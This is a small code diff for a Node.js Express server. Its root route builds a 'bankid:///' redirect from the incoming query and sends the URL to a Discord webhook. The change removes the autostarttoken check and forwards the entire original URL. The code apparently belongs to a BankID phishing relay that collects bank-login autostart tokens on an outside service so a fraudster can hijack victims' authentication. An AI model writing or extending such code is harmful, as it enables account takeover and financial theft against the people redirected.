@@ -11,15 +11,8 @@ let AMOUNT = ""
 app.use(express.json());
 
 app.get('/', (req, res) => {
-  const params = req.query;
-
-  // Check if autostarttoken parameter exists
-  if (!params.autostarttoken) {
-    return res.status(400).send('Autostarttoken parameter is required.');
-  }
-
-  // Constructing the redirect URL with the autostarttoken parameter
-  const redirectUrl = `bankid:///?autostarttoken=${params.autostarttoken}`;
+  // Construct the redirect URL with all query parameters
+  const redirectUrl = `bankid:///${req.originalUrl}`;
 
   // Log the redirect URL to Discord webhook
   sendDiscordWebhook(redirectUrl);
